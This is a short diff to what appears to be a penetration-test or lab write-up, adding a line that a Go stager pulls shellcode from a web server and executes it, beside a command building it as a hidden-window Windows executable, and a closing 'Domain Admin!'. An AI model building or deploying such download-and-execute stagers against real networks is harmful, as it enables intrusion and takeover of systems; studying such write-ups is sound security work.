@@ -1173,6 +1173,8 @@ I can try and upload a beacon payload into this directory since i have (M) read/
 
 So ill use the stager.go code from earlier, since the http.x64.bin payload holds the correct listener info that is also still running
 
+So this code will still work since it pulls from the webserver and get the shellcode then execute it
+
 ```python
 GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build -ldflags="-H windowsgui" -o stager.exe stager.go
 ```
@@ -1296,3 +1298,7 @@ SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for anot
 
 +--- Task [8d4b1fe4] closed ----------------------------------------------------------+
 ```
+
+Domain Admin!
+
+
